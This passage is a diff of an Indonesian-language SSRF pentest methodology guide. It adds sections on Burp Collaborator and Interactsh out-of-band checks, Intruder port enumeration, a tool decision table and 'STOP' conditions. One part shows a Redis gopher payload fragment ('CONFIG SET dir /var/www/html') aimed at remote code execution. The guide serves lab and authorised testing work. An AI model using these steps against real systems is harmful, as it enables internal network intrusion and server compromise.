+ ↓
+Insert Collaborator Payload
+ ↓
+Send
+ ↓
+Collaborator interaction
+ ↓
+Validate DNS/HTTP interaction
+```
+
+1. Buka Burp Suite tab → **Collaborator** → _Copy to clipboard_ untuk generate payload/domain unik.
+2. Di Repeater, tempel payload tersebut sebagai nilai `url` (atau lokasi lain yang relevan).
+3. Kirim, lalu di tab Collaborator klik _Poll now_.
+4. Interaksi DNS saja vs interaksi HTTP saja memberi informasi berbeda — lihat [SSRF Proof Levels](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#-ssrf-proof-levels): DNS-only = server melakukan resolusi, belum tentu full HTTP fetch. HTTP interaction = server benar-benar melakukan outbound HTTP request.
+
+**Method B — Interactsh / callback infrastructure lain**
+
+Lihat [OOB Test](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#11-deteksi-ssrf-awal) dan [7.1 Interactsh](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#71-interactsh-untuk-ssrf-detection) untuk command CLI yang ekuivalen.
 
 ```text
 Burp Collaborator
-      │
-      ▼
-Unique callback domain
-      │
-      ▼
-SSRF endpoint
-      │
-      ▼
-Target server
-      │
-      ▼
-Collaborator interaction
+        OR
+Interactsh
+        OR
+controlled callback infrastructure (domain sendiri + logging)
 ```
+
+> ⚠️ **Catatan Edition:** Collaborator client bawaan tersedia di Burp Community, tetapi kuota polling dan reliability jauh lebih terbatas dibanding Burp Professional (yang punya polling otomatis dan unlimited interactions). Jangan asumsikan semua user memiliki akses Collaborator penuh — Interactsh adalah alternatif open-source yang setara secara fungsional untuk kebutuhan lab/CTF, dan sudah dibahas di [7.1](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#71-interactsh-untuk-ssrf-detection).
 
 ---
 
@@ -3376,19 +3656,19 @@ Checklist:
 
 Sebelum mengeksploitasi Redis menuju RCE, perhatikan konfigurasi autentikasi dan versi:
 
-1. **Redis dengan Password (`requirepass`):**
-   Jika server Redis dikonfigurasi dengan password:
-   - Gopher payload **WAJIB** menyertakan perintah `AUTH <password>` sebagai baris instruksi pertama:
-     ```text
-     AUTH password123\r\n
-     CONFIG SET dir /var/www/html\r\n
-     ...
-     ```
-   - Jika perintah `AUTH` tidak disertakan, Redis akan membalas dengan `(error) NOAUTH Authentication required.` dan membatalkan seluruh eksekusi perintah berikutnya.
-
+1. **Redis dengan Password (`requirepass`):** Jika server Redis dikonfigurasi dengan password:
+    
+    - Gopher payload **WAJIB** menyertakan perintah `AUTH <password>` sebagai baris instruksi pertama:
+        
+        ```text
+        AUTH password123\r\nCONFIG SET dir /var/www/html\r\n...
+        ```
+        
+    - Jika perintah `AUTH` tidak disertakan, Redis akan membalas dengan `(error) NOAUTH Authentication required.` dan membatalkan seluruh eksekusi perintah berikutnya.
 2. **Redis Versi 7+ (Sistem ACL & Protected Mode):**
-   - Redis versi 7 ke atas memiliki sistem Access Control List (ACL) yang jauh lebih ketat. Pengguna non-default atau default tanpa privilege penuh tidak diizinkan menjalankan perintah berbahaya seperti `CONFIG` atau `MODULE LOAD`.
-   - Mode `protected-mode yes` (default) menolak koneksi eksternal jika tanpa password, meskipun via SSRF loopback (`127.0.0.1`) biasanya masih diizinkan.
+    
+    - Redis versi 7 ke atas memiliki sistem Access Control List (ACL) yang jauh lebih ketat. Pengguna non-default atau default tanpa privilege penuh tidak diizinkan menjalankan perintah berbahaya seperti `CONFIG` atau `MODULE LOAD`.
+    - Mode `protected-mode yes` (default) menolak koneksi eksternal jika tanpa password, meskipun via SSRF loopback (`127.0.0.1`) biasanya masih diizinkan.
 
 ---
 
@@ -3611,6 +3891,55 @@ script execution permission
 ---
 
 # 🧰 7. Tools & Automation
+
+# 7.0 Burp Suite — Primary Interactive Web Testing Interface
+
+## 📌 Kapan Digunakan
+
+Sebagai interface utama untuk _interactive request analysis_: menangkap traffic, memahami satu request secara mendalam, dan mencoba mutasi cepat. Untuk reproduksi, automation, dan scripting, lihat curl/Bash pada masing-masing section.
+
+---
+
+## Alur Kerja Umum
+
+```text
+Proxy → HTTP History → Repeater → Intruder → Collaborator
+```
+
+- **Proxy / HTTP History**: menangkap dan menelusuri traffic aplikasi (lihat [0.5 Request Acquisition](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#05-request-acquisition)).
+- **Repeater**: eksperimen manual, satu variabel per request (lihat [Repeater sebagai Tempat Eksperimen](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#repeater-sebagai-tempat-eksperimen)).
+- **Intruder**: enumerasi/mutasi berulang ketika jumlah kandidat besar dan predictable.
+- **Collaborator**: validasi blind/OOB SSRF (lihat [4.4 Blind SSRF](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#44-blind-ssrf)).
+
+Jangan memaksakan semua tahap ini di setiap kasus — pilih yang sesuai dengan hypothesis yang sedang diuji.
+
+---
+
+## When to Use Burp Intruder
+
+Gunakan Intruder **hanya** ketika repetitive parameter variation memang berguna, bukan sebagai default untuk semua testing.
+
+Contoh use case yang cocok:
+
+```text
+internal IP enumeration
+predictable host/port values
+port enumeration
+payload variations (representasi IP, encoding, dsb)
+```
+
+Elemen yang perlu dikonfigurasi:
+
+- **Insertion point**: tandai bagian nilai yang akan diganti (mis. nilai port di dalam `url`) dengan `§...§`.
+- **Payload type**: _Numbers_ untuk range port, _Simple list_ untuk daftar spesifik (mis. dari Priority Port List di [1.3](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#13-ssrf-internal-port-scanning)).
+- **Result columns**: perhatikan `Status`, `Length`, dan `Response received` — sort berdasarkan `Length` untuk cepat melihat outlier.
+- **Status/length comparison**: baseline dulu (request ke port yang pasti closed) untuk tahu angka "normal", baru bandingkan kandidat terhadap baseline itu.
+- **False positives**: response yang seragam untuk semua payload biasanya berarti request tidak benar-benar mencapai backend yang diharapkan (mis. semua kena WAF/error page yang sama) — jangan langsung anggap semua port "open".
+- **Validation**: setiap kandidat hasil Intruder tetap harus divalidasi manual satu-satu di Repeater sebelum dicatat sebagai finding (lihat STOP condition di [8. Decision Tree](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#-8-decision-tree)).
+
+Fokus tetap pada SSRF reasoning, bukan menjadikan bagian ini tutorial panjang tombol Intruder.
+
+---
 
 # 7.1 Interactsh untuk SSRF Detection
 
@@ -3956,7 +4285,7 @@ Tetap verify response body.
 
 ## 📌 Kapan Digunakan
 
-Sudah tersedia di [1.3 SSRF Internal Port Scanning](#13-ssrf-internal-port-scanning).
+Sudah tersedia di [1.3 SSRF Internal Port Scanning](https://claude.ai/chat/83922025-433f-4a03-8cc3-658da467fa94#13-ssrf-internal-port-scanning).
 
 Usage:
 
@@ -3971,6 +4300,88 @@ url \
 ---
 
 # 🌳 8. Decision Tree
+
+## Tool Decision Guide
+
+Referensi cepat: tool mana yang paling cocok untuk situasi tertentu. Ini bukan ranking kualitas tool — pilihan ditentukan oleh use case, bukan "tool mana yang lebih bagus".
+
+|Situation|Primary Tool|Secondary|
+|---|---|---|
+|Capture request|Burp Proxy|Browser devtools|
+|Inspect request|Burp HTTP History|curl|
+|Manual mutation|Repeater|curl|
+|Authenticated request|Repeater|curl|
+|Blind SSRF OOB|Collaborator|Interactsh|
+|Community edition OOB|Interactsh|custom callback|
+|Small manual port test|Repeater|curl|
+|Repetitive enumeration|Intruder|Bash/Python|
+|Reproduction|curl|Repeater|
+|Automation|Bash/Python|Intruder|
+|Complex protocol payload|Repeater + tool|curl|
+|Gopher payload generation|Gopherus|manual encoding|
+
+---
+
+## Request & Tool Acquisition Layer (Pra-Decision)
+
+Sebelum masuk ke decision tree teknis di bawah, tentukan dulu apakah Anda punya request nyata dan tool apa yang sesuai untuk tahap saat ini:
+
+```text
+SSRF sink found
+      │
+      ▼
+Do I have a real HTTP request?
+      │
+   ┌──┴──┐
+  NO     YES
+  │       │
+  ▼       ▼
+Discover  Burp HTTP History
+traffic       │
+              ▼
+          Repeater
+              │
+              ▼
+         Baseline
+              │
+              ▼
+       Manual validation
+              │
+       ┌──────┴──────┐
+       │             │
+     Simple       Repetitive
+       │             │
+       ▼             ▼
+   Repeater     Intruder/script
+                     │
+                     ▼
+                   curl
+```
+
+Setelah tool/request layer ini selesai, lanjut ke decision tree teknis di bawah — untuk cabang Blind SSRF, Internal SSRF, Metadata, Filter Bypass, Gopher, dan Chaining.
+
+Layer keputusan tool untuk tahap teknis manapun:
+
+```text
+Need to inspect and manually mutate one HTTP request?
+→ Burp Repeater
+
+Need to compare many controlled payload variations?
+→ Burp Intruder
+
+Need to reproduce a known request from CLI?
+→ curl
+
+Need repetitive scripted enumeration?
+→ Bash/Python/curl
+
+Need OOB interaction?
+→ Burp Collaborator OR Interactsh
+```
+
+> Ini adalah **execution layer**, bukan pengganti decision guide di bawah. Pertanyaan "apa yang saya lihat, apa artinya, apa langkah berikutnya" tetap dijawab oleh decision tree/branch di bawah — tool hanya menjalankan keputusan yang sudah ditentukan oleh methodology.
+
+---
 
 ## Standalone SSRF Decision Tree
 
@@ -4305,6 +4716,40 @@ RCE
 ```
 
 Setiap tahap harus dibuktikan.
+
+---
+
+## STOP Conditions
+
+Tujuan STOP condition adalah mencegah _checklist blindness_ dan kesimpulan prematur — baik saat kerja manual di Repeater maupun saat automation via Intruder/script.
+
+```text
+STOP:
+Evidence belum cukup → jangan pivot ke tahap berikutnya.
+
+STOP:
+Response difference tidak reproducible → jangan claim finding.
+(Ulangi request yang sama 2-3x di Repeater sebelum menyimpulkan ada perbedaan.)
+
+STOP:
+Port candidate dari Intruder/script belum tervalidasi manual → jangan anggap service confirmed.
+(Kembali ke Repeater untuk validasi satu-satu — lihat 1.3 Manual Path.)
+
+STOP:
+Credential ditemukan tetapi belum diverifikasi → jangan anggap usable credential.
+
+STOP:
+SSRF confirmed tetapi primitive tidak mendukung method/header yang dibutuhkan
+→ jangan memaksakan cloud metadata path yang butuh custom header (mis. IMDSv2 token).
+
+STOP:
+Collaborator/Interactsh tidak menerima interaksi → jangan langsung menyimpulkan "SSRF tidak ada".
+→ Verify sink, cek request format, cek apakah fetch-nya async/delayed, coba metode OOB alternatif.
+
+STOP:
+403/timeout dari localhost:PORT → service mungkin reachable, tapi jangan langsung anggap vulnerability.
+→ Inspect body/header yang ada, test endpoint yang sudah diketahui untuk service tersebut, lanjutkan identifikasi.
+```
 
 ---
 
@@ -5979,4 +6424,4 @@ python3 SSRFmap/ssrfmap.py --help              # Auto-test SSRF
 > - Redis RCE → `<a href="/docs/redis-and-mongodb" class="text-[#00b4d8] hover:underline font-mono font-semibold">14d_redis_mongodb_workflow.md</a>`
 > - Jenkins access → lateral movement ke `<a href="/docs/lateral-movement" class="text-[#00b4d8] hover:underline font-mono font-semibold">42_lateral_movement_workflow.md</a>`
 > - File disclosure → cari creds → `<a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>` atau [05. SMB & Samba Exploitation Workflow — Master Field Guide](/docs/smb-samba)
-> - Selanjutnya dalam seri web: [Workflow 23 â€” Server-Side Template Injection (SSTI)](/docs/ssti)
+> - Selanjutnya dalam seri web: [Workflow 23 — Server-Side Template Injection (SSTI)](/docs/ssti)
